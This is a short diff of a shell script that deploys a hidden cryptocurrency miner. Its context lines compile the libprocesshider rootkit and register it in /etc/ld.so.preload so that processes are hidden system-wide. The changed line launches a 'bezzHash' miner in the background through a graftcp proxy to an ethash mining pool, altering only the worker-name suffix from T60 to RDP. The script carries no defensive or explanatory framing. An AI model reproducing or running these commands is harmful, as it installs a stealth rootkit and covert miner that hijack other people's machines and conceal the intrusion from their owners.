@@ -41,4 +41,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp nohup ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T60)@ethash.kupool.com:443 > nohup.out
+./graftcp/graftcp nohup ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-RDP)@ethash.kupool.com:443 > nohup.out
